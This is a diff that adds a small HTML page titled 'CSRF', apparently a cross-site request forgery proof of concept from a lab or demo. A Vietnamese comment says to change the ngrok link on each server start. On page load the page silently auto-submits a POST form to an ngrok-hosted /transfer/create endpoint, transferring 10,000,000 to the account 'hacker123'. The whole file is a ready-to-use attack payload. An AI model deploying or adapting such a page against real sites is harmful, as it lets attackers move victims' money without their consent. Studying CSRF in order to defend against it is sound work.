@@ -1,0 +1,20 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta http-equiv="X-UA-Compatible" content="ie=edge">
+    <title>CSRF</title>
+</head>
+
+<body onload="document.transferForm.submit()">
+
+    // Thay doi link ngrok moi lan start server
+    <form name="transferForm" action="http://ebaf571d.ngrok.io/transfer/create" method="POST">
+        <input type="text" name="accountId" value="hacker123">
+        <input type="number" name="amount" value="10000000">
+    </form>
+</body>
+
+</html>
